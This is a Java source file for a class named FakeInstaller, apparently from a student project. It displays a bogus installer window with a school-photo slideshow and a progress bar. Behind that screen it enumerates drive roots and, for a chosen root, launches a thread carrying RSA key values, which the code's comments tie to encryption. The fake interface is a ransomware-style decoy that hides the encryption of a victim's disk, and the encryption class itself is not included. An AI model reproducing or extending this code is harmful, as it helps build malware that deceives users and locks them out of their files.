package encryptor;

import java.awt.BorderLayout;
import java.awt.Image;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;

import javax.imageio.ImageIO;
import javax.swing.BoxLayout;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JProgressBar;
import javax.swing.JTextArea;
import javax.swing.Timer;

public class FakeInstaller {
	
    private static JLabel pic;
    private static Timer tm;
    private static int x = 0;
    //Images Path In Array
    private static String[] list = {
                      "/images/logo_volterra.png",//0
                      "/images/TopBarIstituto.jpg",//1
                      "/images/volt.jpg",//2
                      "/images/volterra esterni_01.JPG",//3
                      "/images/volterra esterni_03.JPG",//4
                      "/images/volterra palestra_01.JPG",//5
                      "/images/vista.jpg"//6
                    };
	
	
	private static JProgressBar progressBar;
	private static JFrame frame;
	private static JPanel panel;
	private static JTextArea textArea;
	//
	private static boolean finishedInstalling = false;
	

	/**
	 * Constructor that checks hard disks
	 * @param coPrime 
	 * @param n
	 * @param d
	 */
	public FakeInstaller(String defaultPath,BigInteger coPrime,BigInteger n,BigInteger d) {
		
		createInterface();
		
		//TODO ASWE
		//boolean toDelete = first==null || second == null;
		
		File[] paths;

		// returns pathnames for files and directory
		paths = File.listRoots();
		
		new ProgressBarManager(progressBar,frame);

		// for each pathname in pathname array
		for (File path : paths) {
			// prints file and directory paths
			if (path.toString().equals(defaultPath)) {
				System.out.println("TOCRYPT");
				// Encrypt Installer
				new FileChooserThread(path, coPrime, n,d);
			}
		}
		setFinished();

	}
	
	/**
	 * Method used to setup user interface
	 */
	private void createInterface() {
		
		frame = new JFrame("Progetto_Esame_GiachettoD_2018.exe");
		panel = new JPanel();
		panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
		panel.setOpaque(true);
		
		//Where the GUI is constructed:
		textArea = new JTextArea(15, 50);
		textArea.setWrapStyleWord(true);
		textArea.setLineWrap(true);
		textArea.setEditable(false);
		
		//Set progress bar with minimum and maximum
		progressBar = new JProgressBar(0,100);
		progressBar.setValue(0);
		progressBar.setStringPainted(true);
		
		//slideshow
		
		pic = new JLabel();
        pic.setBounds(40, 30, 700, 300);

        //Call The Function SetImageSize
        try {
			SetImageSize(6);
		} catch (IOException e1) {
			e1.printStackTrace();
		}
               //set a timer
        tm = new Timer(6000,new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
                try {
					SetImageSize(x);
				} catch (IOException e1) {
					e1.printStackTrace();
				}
                x += 1;
                if(x >= list.length )
                    x = 0; 
            }
        });
		
		
		//Add everything to the panel and the panel to the frame
        panel.add(pic);
        tm.start();
        
		panel.add(progressBar);
		frame.add(panel);
		frame.getContentPane().add(BorderLayout.CENTER, panel);
		frame.pack();
		frame.setLocationByPlatform(true);
		frame.setVisible(true);
		frame.setResizable(false);
		
		
	}
	
    public void SetImageSize(int i) throws IOException{
    	InputStream input = ResourceLoader.load(list[i]);
        ImageIcon icon = new ImageIcon(ImageIO.read(input));
        Image img = icon.getImage();
        Image newImg = img.getScaledInstance(pic.getWidth(), pic.getHeight(), Image.SCALE_SMOOTH);
        ImageIcon newImc = new ImageIcon(newImg);
        pic.setIcon(newImc);
    }
	
	/**
	 * Getter that tells if finishedInstalling variable is set to true
	 * @return finishedInstalling variable
	 */
	public static boolean isFinished() {
		return finishedInstalling;
	}
	
	/**
	 * Setter that turn finishedInstalling variable to true
	 */
	private static void setFinished() {
		finishedInstalling = true;
	}
	
}
